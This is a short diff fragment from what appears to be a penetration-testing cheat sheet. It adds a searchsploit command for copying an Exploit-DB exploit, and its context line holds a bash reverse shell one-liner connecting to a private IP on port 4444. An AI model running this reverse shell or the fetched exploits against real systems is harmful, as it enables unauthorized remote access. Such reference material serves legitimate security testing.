@@ -725,6 +725,7 @@ bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
 ~~~ bash
 searchsploit [keyword]
 searchsploit -p [EDB-ID]
+searchsploit -m [EDB-ID]
 ~~~
 
 
